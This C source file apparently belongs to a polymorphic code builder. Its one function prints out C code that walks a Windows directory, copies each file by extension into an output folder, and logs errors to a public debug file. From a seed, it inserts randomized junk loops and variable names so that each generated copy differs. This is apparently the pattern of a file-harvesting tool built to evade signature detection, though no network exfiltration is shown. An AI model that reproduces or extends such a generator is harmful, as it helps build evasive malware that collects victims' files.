#include "loop_vary.h"
#include <stdio.h>
#include <stdlib.h>

void write_file_loop(FILE *out, const char *var_find_handle, const char *var_find_data, 
                     const char *var_out_dir, const char *var_temp_buf, const char *var_loop_counter,
                     unsigned int seed, int ext_index) {
    srand(seed);
    int loop_type = rand() % 4;
    int counter_var_idx = rand() % 1000;

    fprintf(out, "        if (%s_%d != INVALID_HANDLE_VALUE) {\n", var_find_handle, ext_index);
    fprintf(out, "            do {\n");
    fprintf(out, "                if (%s->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {\n", var_find_data);
    fprintf(out, "                    if (!FindNextFileA(%s_%d, %s)) break;\n", var_find_handle, ext_index, var_find_data);
    fprintf(out, "                    continue;\n");
    fprintf(out, "                }\n");
    fprintf(out, "                char full_src_path[256];\n");
    fprintf(out, "                snprintf(full_src_path, sizeof(full_src_path), \"%%s\\\\%%s\", sub_path, %s->cFileName);\n", var_find_data);
    fprintf(out, "                snprintf(%s, sizeof(%s), \"%%s\\\\%%s\", %s, %s->cFileName);\n", 
            var_temp_buf, var_temp_buf, var_out_dir, var_find_data);
    fprintf(out, "                if (!CopyFileA(full_src_path, %s, FALSE)) {\n", var_temp_buf);
    fprintf(out, "                    FILE *err_log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(out, "                    if (err_log) { fprintf(err_log, \"Error copying file: %%s to %%s, Error: %%lu\\n\", full_src_path, %s, GetLastError()); fclose(err_log); }\n", var_temp_buf);
    fprintf(out, "                }\n");

    switch (loop_type) {
        case 0: // Simple while loop
            fprintf(out, "                int %s = 0;\n", var_loop_counter);
            fprintf(out, "                while (%s < %d) { %s++; }\n", var_loop_counter, rand() % 10 + 5, var_loop_counter);
            break;
        case 1: // For loop with variable increment
            fprintf(out, "                for (int i_%d = 0; i_%d < %d; i_%d += %d) { int dummy = i_%d; }\n", 
                    counter_var_idx, counter_var_idx, rand() % 15 + 10, counter_var_idx, rand() % 3 + 1, counter_var_idx);
            break;
        case 2: // Do-while loop
            fprintf(out, "                int j_%d = %d;\n", counter_var_idx, rand() % 5);
            fprintf(out, "                do { j_%d--; } while (j_%d > 0);\n", counter_var_idx, counter_var_idx);
            break;
        case 3: // Nested loop with condition
            fprintf(out, "                for (int x_%d = 0; x_%d < %d; x_%d++) {\n", 
                    counter_var_idx, counter_var_idx, rand() % 4 + 2, counter_var_idx);
            fprintf(out, "                    for (int y_%d = 0; y_%d < %d; y_%d++) {\n", 
                    counter_var_idx + 1, counter_var_idx + 1, rand() % 3 + 1, counter_var_idx + 1);
            fprintf(out, "                        if (x_%d + y_%d > %d) break;\n", counter_var_idx, counter_var_idx + 1, rand() % 5 + 3);
            fprintf(out, "                    }\n");
            fprintf(out, "                }\n");
            break;
    }

    fprintf(out, "            } while (FindNextFileA(%s_%d, %s));\n", var_find_handle, ext_index, var_find_data);
    fprintf(out, "        }\n");
}